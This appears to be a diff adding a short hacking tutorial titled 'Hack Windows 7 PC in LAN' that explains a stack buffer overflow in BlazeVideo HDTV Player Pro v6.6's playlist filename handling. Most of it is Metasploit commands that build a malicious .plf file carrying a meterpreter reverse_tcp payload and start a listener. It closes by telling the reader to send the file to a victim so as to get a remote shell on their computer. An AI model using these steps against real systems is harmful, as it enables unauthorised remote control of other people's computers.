@@ -1,0 +1,25 @@
+
+Hack Windows 7 PC in LAN using Blaze Video HDTV Player Pro v6.6 Filename Handling Vulnerability
+
+This module exploits a vulnerability found in BlazeVideo HDTV Player’s filename handling routine. When supplying a string of input data embedded in a .plf file, the MediaPlayerCtrl.dll component will try to extract a filename by using PathFindFileNameA(), and then copies whatever the return value is on the stack by using an inline strcpy. As a result, if this input data is long enough, it can cause a stack-based buffer overflow, which may lead to arbitrary code execution under the context of the user.
+BlazeVideo HDTV Player Pro v6.6.0.3
+Attacker: Backtrack 5
+Victim PC: Windows 7
+Open backtrack terminal type msfconsole
+
+Now type use exploit/windows/fileformat/blazedvd_hdtv_bof
+msf exploit (blazedvd_hdtv_bof)>set payload windows/meterpreter/reverse_tcp
+msf exploit (blazedvd_hdtv_bof)>set lhost 192.168.1.3 (IP of Local Host)
+msf exploit (blazedvd_hdtv_bof)>exploit 
+
+After we successfully generate the malicious playlist file File, it will stored on your local computer
+/root/.msf4/local/msf.plf
+
+Now we need to set up a listener to handle reverse connection sent by victim when the exploit successfully executed.
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 192.168.1.3
+exploit 
+Now send your msf.plf files to victim, as soon as they download and open it. Now you can access meterpreter shell on victim computer.
+
+
